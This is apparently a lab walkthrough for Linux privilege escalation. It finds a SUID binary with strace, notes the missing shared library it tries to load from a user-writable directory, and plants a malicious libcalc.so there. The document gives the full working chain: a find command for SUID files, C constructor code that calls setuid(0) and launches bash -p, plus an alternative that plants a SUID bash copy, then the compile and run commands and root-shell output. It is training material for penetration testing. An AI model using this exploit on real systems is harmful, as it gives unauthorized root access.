When a program is executed, it will try to load the shared objects it requires.

By using a program called strace , we can track these system calls and determine whether any shared objects were not found.

If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.

1. Find SUID/SGID files on the target:

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

==-rwsr-sr-x 1 root staff 9861 May 14 2017 /usr/local/bin/suid-so==

The suid-so file should execute with root user permissions.

2. Run strace on the SUID file:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory)
==open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)==

The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to.

3. Create the /home/user/.config directory.

4. Create the file libcalc.c with the following contents:

==libcalc.c==

---

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
 setuid(0);
 system("/bin/bash -p");
 # system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```


---

5. Compile libcalc.c into /home/user/.config/libcalc.so:

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

6. Run the SUID executable to get a root shell:

```
/usr/local/bin/suid-so
```

Calculating something, please wait…

```
id
```

uid=0(root) gid=1000(user) egid=50(staff) groups=0(root) ...
